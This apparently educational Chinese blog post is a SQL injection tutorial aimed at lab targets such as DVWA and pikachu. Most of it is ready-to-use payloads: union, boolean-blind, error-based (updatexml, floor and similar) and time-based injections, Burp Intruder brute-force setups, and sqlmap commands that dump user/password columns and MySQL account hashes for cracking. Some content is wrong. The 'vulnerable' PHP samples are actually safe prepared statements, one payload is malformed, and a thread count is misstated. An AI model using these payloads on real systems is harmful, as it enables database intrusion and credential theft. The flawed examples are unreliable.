---
layout: post
title: SQL注入详解
categories: 网络安全
description: SQL注入详解
keywords: SQL注入详解
---

SQL注入的几种方式详解

### 1、union联合注入原理

联合查询注入是联合两个表进行注入攻击，使用关键词 union select 对两个表进行联合查询。

假设服务端代码如下

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();
        $row = $data->fetch();

        // Make sure only 1 result is returned
        if( $data->rowCount() == 1 ) {
            // Get values
            $first = $row[ 'first_name' ];
            $last  = $row[ 'last_name' ];

            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```

可以看出获取`id`之后直接拼接进入了SQL语句中，此处会有sql注入漏洞。

确定了有漏洞然后就可以根据思路去猜字段，可以通过`order by`来猜有几个字段，两个表的字段要数要相同，不然会出现报错。

```sql
SELECT * FROM `users` WHERE user_id = 1 order by 8 
```

猜到了有几个字段可以进行以下查询

```sql
SELECT * FROM `users` WHERE user_id = 1 union select 1,2,3,4,5,6,7,8 
# 可以在数字的位置替换成函数
SELECT * FROM `users` WHERE user_id = 1 union select 1,2,3,4,5,6,database(),user()
# 如果不想显示user_id=1的数据，可以修改成-1或者NULL，就只显示后面的内容了
SELECT * FROM `users` WHERE user_id = -1 union select 1,2,3,4,5,6,database(),user()
# 有很多条结果的时候可以加 limit 来限制
```

#### 1.1 联合查询注入获取敏感信息

当确定了可以进行SQL注入的时候，可以通过一些内置函数来获取数据库的信息

```sql
SELECT * FROM `guestbook` WHERE user_id = -1 union select 1,database(),user();
```

#### 1.2 联合查询注入通过 information_schema 获取表

在黑盒的情况下是不知道当前库有什么表的，可以通过 mysql 自带的information_schema 查询当前库的表。查询当前库的表 `limit 1` 相当于 `limit 1,1 `表示显示第一个 1 改成 2 就是第二个如此类推

```sql
# 有请求连接如下，已知可以字符注入 /sqli/?id=1&Submit=Submit

# 构造语句 获取当前位置的第一个表
/sqli/?id=-1' union select 1, (select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1) --+&Submit=Submit#

# 获取第二个表
/sqli/?id=-1' union select 1, (select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1 ) --+&Submit=Submit#

# 获取字段，可以通过修改limit 获取不同的字段
((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 1))

# 查到字段之后，读取表内的内容
/sqli/?id=-1' union select 1,(select group_concat(user,0x3a,password) from users) --+&Submit=Submit#
```

### 2、boolean  布尔型盲注入

有服务端代码如下

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();

        // Get results
        if( $data->rowCount() == 1 ) {
            // Feedback for end user
            echo '<pre>User ID exists in the database.</pre>';
        }
        else {
            // User wasn't found, so the page wasn't!
            header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

            // Feedback for end user
            echo '<pre>User ID is MISSING from the database.</pre>';
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```

根据代码可以看出来，虽然有sql注入漏洞，但是没有返回具体的数据库的信息，只返回了两种状态，这种叫`盲注入`

盲注入分为两种：

1. 布尔型盲注入
2. 延时注入

#### 2.1 判断盲注入

入 SQL 注入检测语句 判断页面是否不一样，如果不一样大概会存在 SQL 注入漏洞` 1'and '1'='1 `一样，` 1'and '1'='2` 不一样，如果输入检测语句页面没有任何改变可以使用延时语句进行检测 `1'and sleep(10)--+ `通过这两个检测方法的判断，可以确定存在 SQL 注入漏洞。

普通盲注入判断：

```txt
# 有以下两个注入语句
/sqli_blind/?id=1' and 1=1 -- &Submit=Submit#    #返回User ID exists in the database.
/sqli_blind/?id=1' and 1=2 -- &Submit=Submit#    #返回User ID is MISSING from the database.
```

延时注入判断：

```txt
sqli_blind/?id=1' and sleep(2) -- &Submit=Submit#
```

#### 2.2 布尔型注入

布尔型注入攻击，因为页面不会返回任何数据库内容，所以不能使用联合查询将敏感信息显示在页面，但是可以通过构造 SQL 语句，获取数据。

布尔型盲注入用到得 SQL 语句 select if(1=1,1,0)，if()函数在 mysql 是判断，第一个参数表达式，如果条件成立，会显示 1，否则显示 0。1=1 表达式可以换成构造的 SQL 攻击语句。

```txt
# 构建url
sqli_blind/?id=1' and if(3>2,1,0) -- 
```

#### 2.3 布尔型盲注入获取敏感信息

在黑盒的环境下，通过构造 SQL 注入语句，根据页面的特征确定获取敏感信息。

布尔型盲注入用到的函数`SUBSTRING()`：字符串截取，第一个参数是字符串，第二个参数是开始截取 第三个是截取的长度。

select database()查询当前库。

盲注入获取库名流程：

1. 用 if 函数进行构造 select if(SUBSTRING(database(),1,1)='d',1,0) 判断数据库第一个字是不是字符 d，如果是返回 1 否则返回 0 。
2. 接着判断第二个字符。将 substring 第二个参数写成 2 因为要截取第二个字符
   select if(SUBSTRING(database(),2,1)='v',1,0) 第二个字符为 v。如此类推。再后拼接字符就是完整的库名

很多时候是黑盒模式，不知道库名，也不知道啥的，我们就要首先判断注入，判断完注入就获取数据库的长度，得到长度再查询库名，通过库名再查询表，接着通过表查询字段，最后查询某表指定的数据。

#### 2.4 布尔型盲注入查询长度

要查询当前库名，首先确定要查询数据库的长度，再通过截取字符进行对比。

构造注入语句

```txt
# 盲猜数据库名的长度是4，判断输出是1还是0进行确认长度，可能需要多次尝试才可以试出来
sqli_blind/?id=1' and if(length(database())=4,1,0)--+&Submit=Submit#
```

知道了库名的长度是4，截取每个字符再进行判断

```txt
# 截取字符判断
1' and if(substring(database(),1,1)='a',1,0)--+
1' and if(substring(database(),1,1)='d',1,0)--+

1' and if(substring(database(),2,1)='v',1,0)--+
...
#... 疯狂尝试
```

每次截取的值都要与这些字符`0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_`对比，进行判断，最后得到库名。

手动注入这么多次累死了，可以配合burp suite进行抓包检测

burp suite进行sql注入流程：

1. 抓到数据包发送到intruder
2. 清除掉所有变量之后，添加变量，如下：`?id=1%27%20and%20if(substring(database(),§1§,1)=%27§v§%27,1,0)--+&Submit=Submit`，选择`attack type=cluster bomb`
3. 第一个变量知道长度是4，所以设置`payload type=Numbers`,设置`payload options[Numbers]`的number range为1~4，每次递增1，`number format`设置为`Hex`
4. 第二个变量就是上面的那一串字符串，可以通过`add from list`选择`a-z/A-Z/0-9`最后再把`.@_`依次添加进去，MySQL大小写不敏感，可以不添加大写的`A-Z`
5. 执行攻击，通过状态`200`的排序查看，可以获得以下数据`4:a/1:d/2:v/3:w`，通过`1-4`的顺序，组合出库名为`dvwa`

#### 2.5 布尔型盲注配合burp suite获取表名

获取表名的sql语句大概如下：

```sql
select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()
```

构建出攻击判断语句如下：

```txt
1'and if(substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1),1,1)='g',1,0)--+
```

不知道长度，所以需要设置一个比较大的值，比如40

然后根据上面配置burp suite的方法攻击获得表名`guestbook`

获取第二个表

```txt
1'and if(substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1),1,1)='g',1,0)--+
```

第二个表为`users`

获取多个表就把`limit §1§,1`这个地方设置为变量

ps：limit是从0开始算的，获取第一个就是`limit 0, 1`：从第0个位置截取1个，就是获取第一个。

#### 2.6 布尔型盲注配合burp suite获取列

和上面的获取方法类似，我们获取到表名为`guestbook`,构建攻击语句

```txt
1'and if(substring((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='guestbook' limit 1,1),1,1)='a',1,0)--+
```

获得第二个列名为`comment`

ps：因为`information_schema`会有所有库的内容，所以最好加一个条件限制到当前库`and TABLE_SCHEMA=database()`,否则可能会读取到其他库的同样表名的列

```txt
1'and if(substring((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' and TABLE_SCHEMA=database() limit 1,1),1,1)='a',1,0)--+
```

想要获取全部的列，把`limit 1,1`也换成变量然后配置即可`limit ` §1§, 1

#### 2.7  布尔型盲注配合burp suite获取数据

知道库名、表名、列名之后获取数据就很简单了，构建语句如下：

```txt
1'and if(substring((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)='a',1,0)--+
```

`0x3a`是`:`的意思，在匹配的时候规则里最好加个`:`进去，不加也行，就是不好区分账户和密码在哪里分割的

这里因为密码不知道是明文密码还是其他加密方式的密码，长度不确定，所以第一个字段的长度最好给大点，比如`100`，不够再加。

`burpsuite`的排序是有点问题的，会出现`1/10/11/2`这种排序问题，可以保存到文本里，用脚本跑一下排个序就好了

### 3、报错注入

数据库显错是指，数据库在执行时，遇到语法不对，会显示报错信息。

例如：

-  You have an error in your SQL syntax; check the manual that corresponds to
   your MySQL server version for the right syntax to use near ''' at line 1

程序开发期间需要告诉使用者某些报错信息 方便管理员进行调试，定位文件错误。特别 php 在执行 SQL 语句时一般都会采用异常处理函数，捕获错误信息。在 php 中 使用 mysql_error()函数。如果 SQL 注入存在时，会有报错信息返回，可以采用报错注入。

代码：

```php
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?> 
```

如上代码当数据库操作失败的时候，会执行`mysqli_error`/`mysqli_connect_error()`，这俩函数会把错误信息显示到前端。

#### 3.1 报错注入攻击

判断是否存在报错注入 输入单引号 如果报错有可能存在报错注入，如果拼接SQL 语句带入到 mysql 执行即存在报错注入。

例如：

```sql
-- 输入 1'and info()--+ 显示当前库，原理是
SELECT first_name, last_name FROM users WHERE user_id = '1' and info()--
-- 会报错显示当前库不存在这个函数 这样当前库名就显示在页面上。
-- FUNCTION dvwa.info does not exist
```

#### 3.2 报错注入获取数据库敏感信息

输入构造的攻击语句 页面返回数据库信息

```txt
sqli/?id=1'and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--+

# 返回：XPATH syntax error: '~root@localhost~'
```

替换user()方法，可以获取不同的信息，比如`version()/database()`

但是采用 `updatexml` 报错函数 只能显示 32 长度的内容，如果获取的内容超过 32字符就要采用字符串截取方法。每次获取 32 个字符串的长度。

1. `floor()`：select * from test where id=1 and (select 1 from (select count(), concat(user(),floor(rand(0)2))x from information_schema.tables group by x)a);
2. `extractvalue()`：select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
3. `updatexml()`：select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
4. `geometrycollection()`：select * from test where id=1 and geometrycollection((select * from(select *from(select user())a)b));
5. `multipoint()`：select * from test where id=1 and multipoint((select * from (select * from(select user())a)b));
6. `polygon()`：select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
7. `multipolygon()`：select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
8. `linestring()`：select * from test where id=1 and linestring((select * from(select * from(select user())a)b));
9. `multilinestring()`：select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
10. `exp()`：select * from test where id=1 and exp(~(select * from(select user())a));

这些方法在过一些防火墙、过一些waf的时候会用得到。

ps：`0x7e`是符号`~`的十六进制

#### 3.3 黑盒模式下报错注入获取库名

在黑盒模式下的报错注入 首先获取当前库，通过库获取表名，接着通过表名获取字段，最后获取字段内容。

获取库名就是上面提到的

1. `1' and info()--+`
2. `1'and (updatexml(1,concat(0x7e,(select database()),0x7e),1))--+`

#### 3.4 报错注入获取MySQL账户和密码

获取账号和密码需要 root 用户才有足够大的权限

查询MySQL密码的语句：

```mysql
select authentication_string from mysql.user limit 1;

-- 获取密码的前32位
select(updatexml(1,concat(0x7e,(select (select authentication_string from mysql.user limit 1 )),0x7e),1))

-- 构建的语句
-- sqli/?id=1'and (updatexml(1,concat(0x7e,(updatexml(1,concat(0x7e,(select (select authentication_string from mysql.user limit 1 )),0x7e),1)),0x7e),1))--+

-- 获取后几位
select(updatexml(1,concat(0x7e,(select (substring((select authentication_string from mysql.user limit 1),32,40))),0x7e),1))
-- 构建的语句
-- sqli/?id=1'and (updatexml(1,concat(0x7e,(updatexml(1,concat(0x7e,(select (substring((select authentication_string from mysql.user limit 1),32,40))),0x7e),1)),0x7e),1))--+
```

拿到完整的数据就可以去破解了。

#### 3.5 报错注入获取表名

通过 mysql 内置库` information_schema `通过构造 SQL 语句查询获取表名

```txt
1'and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+
```

这是获取当前库的第一个表名，如果要获取后面的，把`limit 0,1`改成要获取的参数就行，比如第二个`limit 1, 1`

如果想全部获取下来，可以去通过配合`burp suite`抓包然后进行爆破。配置方式和之前的一样。把`limit 1,1`的第一个`1`修改成变量，然后修改范围`0~10或20`递增1，然后进行爆破就好了。

抓包添加变量后的`positions`窗口的代码

```txt
GET /01/vulnerabilities/sqli/?id=1%27and(select%201%20from(select%20count(*),concat((select%20(select%20(SELECT%20distinct%20concat(0x7e,table_name,0x7e)%20FROM%20information_schema.tables%20where%20table_schema=database()%20LIMIT%20§1§,1))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)--+&Submit=Submit HTTP/1.1
```

#### 3.6 报错注入获取字段名

和上面基本上一样，修改范围`0~10或20`递增1，比如获取`users`的表的字段名

burpsuite抓包=》intruder=》positions窗口的代码修改：

```txt
GET /01/vulnerabilities/sqli/?id=1%27and(select%201%20from(select%20count(*),concat((select%20(select%20(SELECT%20distinct%20concat(0x7e,column_name,0x7e)%20FROM%20information_schema.columns%20where%20table_name=%27users%27%20LIMIT%20§0§,1))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)--+&Submit=Submit HTTP/1.1
```

然后点击`payloads`修改`payload iotions`就好了

想直接显示内容还可以点击`Options => Grep-extract => fetch response =》 弹出的窗口里选择'id'`，然后再进行攻击，攻击窗口就会直接显示获得的值

#### 3.7 报错注入获取字段内容

知道了users表的名字和字段名，就可以获取值了

```txt
1'and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,user,0x3a,password,0x23) FROM users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+
```

把想要获取的字段名，添加进去就好了，修改一下表

使用`burp suite`的方法也和上面一样，把`limit 0, 1`的`0`修改为变量，进行爆破就好了。

### 4、时间注入/延时注入

时间注入又名延时注入，属于盲注入的一种，通常是某个注入点无法通过布尔型注入获取数据而采用一种突破注入的技巧。

在 mysql 里 函数 sleep() 是延时的意思，sleep(10)就是 数据库延时 10 秒返回内容。判断注入可以使用'and sleep(10) 数据库延时 10 秒返回值 网页响应时间至少要 10 秒 根据这个原理来判断存在 SQL 时间注入。

mysql 延时注入用到的函数 `sleep()` 、`if()`、`substring()`

`select if(2>1,sleep(10),0) 2>1` 这个部分就是你注入要构造的 SQL 语句。

`select if(length(database())>1,sleep(5),0)` 这个就是查询当前库大于1就会延时5秒
执行。

`-1' or if(length(database())>1,sleep(5),0)--+ `可以看到网页是大于五秒返回。根据这个原理 n>1 n 不延时就能确定当前数据库的长度了。

如果想要获取数据内容 可以用截取字符再再进行字符对比 如果相同就进行延时。这样就能获取字符接着再拼接就是当当前库的内容。

使用sqlmap进行盲注入

```bash
sqlmap -u "http://192.168.3.16/06/vul/sqli/sqli_str.php?name=Vince&submit=%E6%9F%A5%E8%AF%A2" --technique=T -v 1 --dbms mysql
```

检测完结果如下：

```txt
---
Parameter: name (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=Vince' AND (SELECT 5028 FROM (SELECT(SLEEP(5)))NjzQ)-- Kpug&submit=%E6%9F%A5%E8%AF%A2
---
```

看`payload`内容可以看出可以进行一次时间注入

可以通过`sqlmap`进行注入获取敏感信息，如库名、用户名

```bash
sqlmap -u "http://192.168.3.16/06/vul/sqli/sqli_str.php?name=Vince&submit=%E6%9F%A5%E8%AF%A2" --technique=T -v 1 --dbms mysql --current-db --current-user --batch
```

返回值：

```bash
[07:21:46] [INFO] retrieved: root@localhost
current user: 'root@localhost'
[07:23:27] [INFO] fetching current database
[07:23:27] [INFO] retrieved: pikachu
current database: 'pikachu'
```

可以通过`--technique=T -v 1 --dbms mysql --tables -D pikachu --batch`获取数据库的表

获取到表之后可以通过`--technique=T -v 1 --dbms mysql --columns -T users -D pikachu --batch`获取users表的所有字段

获取字段之后可以获取数据`--technique=T -v 1 --dbms mysql --dump -C "username,password" -T users -D pikachu --batch --threads 10`

`--threads 20`是设置线程为10

查询出来之后，kali的sqlmap会在本地进行MD5碰撞，出结果的话明文密码也会同时展示出来。
